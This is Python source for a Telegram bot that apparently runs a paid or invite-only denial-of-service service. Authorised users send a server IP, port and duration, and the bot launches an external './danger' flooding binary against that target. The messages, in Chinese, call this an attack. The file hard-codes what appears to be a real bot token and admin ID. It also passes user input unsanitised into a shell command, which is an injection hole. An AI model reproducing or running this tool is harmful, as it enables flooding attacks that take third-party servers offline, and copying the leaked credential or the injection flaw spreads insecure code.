import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7278251313:AAES9CxgdsqzFslLn-OucYxU8wx2r-OtN9A'
ADMIN_USER_ID = 5014455361
USERS_FILE = 'users.txt'
清风_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 欢迎你 🔥*\n\n"
        "*攻击指令 /清风 <服务器IP> <服务器端口> <攻击时间/秒>*\n"
        "*开始享受 ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def 添加(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 你需要找主人授权.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 格式: /添加 <add|rem> <user_id>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ 用户 {target_user_id} 添加.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ 用户 {target_user_id} 移除.*", parse_mode='Markdown')

async def run_清风(chat_id, ip, port, duration, context):
    global 清风_in_progress
    清风_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./danger {ip} {port} {duration} 10",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ 攻击出现了错误: {str(e)}*", parse_mode='Markdown')

    finally:
        清风_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ 攻击完成 ✅*\n*感谢您的使用*", parse_mode='Markdown')

async def 清风(update: Update, context: CallbackContext):
    global 清风_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 你需要找主人授权*", parse_mode='Markdown')
        return

    if 清风_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 请等待你的上次攻击完毕再进行下一次攻击*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 格式: /清风 <服务器IP> <服务器端口> <攻击时间/秒>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ 杀戮盛宴 ⚔️*\n"
        f"*🎯 输出: {ip}:{port}*\n"
        f"*🕒 时间: {duration} 秒*\n"
        f"*🔥 开始享受 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_清风(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("添加", 添加))
    application.add_handler(CommandHandler("清风", 清风))
    application.run_polling()

if __name__ == '__main__':
    main()
